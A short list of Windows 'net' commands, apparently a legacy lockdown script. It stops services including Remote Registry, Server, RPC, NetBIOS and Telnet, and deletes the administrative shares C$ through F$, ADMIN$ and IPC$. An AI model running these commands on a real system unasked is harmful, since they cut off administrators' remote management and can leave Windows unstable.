net stop "Remote Registry Service"
net share /delete ADMIN$
net stop "server" >> server.txt
net stop "Computer Browser" 
net stop "REMOTE PROCEDURE CALL"
net stop "netbios"  
net stop "Remote Access Connection Manager"  
net stop "messenger"
net stop "telnet" 
net stop "REMOTE PROCEDURE CALL SERVICE"
net share /delete E$ /y 
net share /delete D$ /y
net share /delete F$ /y
net share /delete C$ /y
net share /delete IPC$